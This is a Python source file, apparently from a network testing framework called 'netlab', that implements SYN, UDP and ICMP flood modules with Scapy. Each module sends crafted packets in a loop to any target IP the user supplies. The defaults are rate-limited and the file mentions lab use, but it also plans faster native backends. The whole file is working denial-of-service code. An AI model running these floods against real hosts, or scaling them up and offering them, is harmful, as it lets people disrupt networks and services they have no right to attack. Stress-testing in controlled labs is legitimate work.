"""Flood modules.

Currently pure-Python (Scapy) implementations with strict rate limiting.
Native C++ backends will replace the send loops later for higher performance.
"""

from __future__ import annotations

import random
import time
from typing import Any

from scapy.all import IP, TCP, UDP, ICMP, send, conf  # type: ignore

from netlab.base import BaseModule, ModuleParam


class SynFlood(BaseModule):
    name = "syn_flood"
    description = "TCP SYN flood (Python/Scapy, rate-limited)"
    category = "l3_l4"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="target", type="ip", label="Target IP", required=True),
            ModuleParam(
                name="port", type="int", label="Target port", required=True, default=80
            ),
            ModuleParam(
                name="interface",
                type="interface",
                label="Network interface",
                required=False,
                default=None,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=15,
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=200,
                description="Keep low in lab environments",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        target = params["target"]
        port = int(params["port"])
        iface = params.get("interface")
        duration = int(params.get("duration", 15))

        if iface:
            conf.iface = iface
        conf.verb = 0

        print(f"[syn_flood] {target}:{port} for {duration}s (rate-limited)")
        start = time.time()

        try:
            while time.time() - start < duration:
                rate_limiter.wait()
                sport = random.randint(1024, 65535)
                pkt = IP(dst=target) / TCP(sport=sport, dport=port, flags="S")
                send(pkt, verbose=0, iface=iface)
                logger.add_packets(1, len(bytes(pkt)))
        except KeyboardInterrupt:
            print("\n[syn_flood] Interrupted")

        print("[syn_flood] Done")


class UdpFlood(BaseModule):
    name = "udp_flood"
    description = "UDP flood (Python/Scapy, rate-limited)"
    category = "l3_l4"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="target", type="ip", label="Target IP", required=True),
            ModuleParam(
                name="port", type="int", label="Target port", required=True, default=53
            ),
            ModuleParam(
                name="interface",
                type="interface",
                label="Network interface",
                required=False,
                default=None,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=15,
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=200,
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        target = params["target"]
        port = int(params["port"])
        iface = params.get("interface")
        duration = int(params.get("duration", 15))

        if iface:
            conf.iface = iface
        conf.verb = 0

        print(f"[udp_flood] {target}:{port} for {duration}s (rate-limited)")
        start = time.time()
        payload = b"A" * 64

        try:
            while time.time() - start < duration:
                rate_limiter.wait()
                pkt = IP(dst=target) / UDP(dport=port) / payload
                send(pkt, verbose=0, iface=iface)
                logger.add_packets(1, len(bytes(pkt)))
        except KeyboardInterrupt:
            print("\n[udp_flood] Interrupted")

        print("[udp_flood] Done")


class IcmpFlood(BaseModule):
    name = "icmp_flood"
    description = "ICMP echo flood (Python/Scapy, rate-limited)"
    category = "l3_l4"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="target", type="ip", label="Target IP", required=True),
            ModuleParam(
                name="interface",
                type="interface",
                label="Network interface",
                required=False,
                default=None,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=15,
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=100,
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        target = params["target"]
        iface = params.get("interface")
        duration = int(params.get("duration", 15))

        if iface:
            conf.iface = iface
        conf.verb = 0

        print(f"[icmp_flood] {target} for {duration}s (rate-limited)")
        start = time.time()

        try:
            while time.time() - start < duration:
                rate_limiter.wait()
                pkt = IP(dst=target) / ICMP()
                send(pkt, verbose=0, iface=iface)
                logger.add_packets(1, len(bytes(pkt)))
        except KeyboardInterrupt:
            print("\n[icmp_flood] Interrupted")

        print("[icmp_flood] Done")
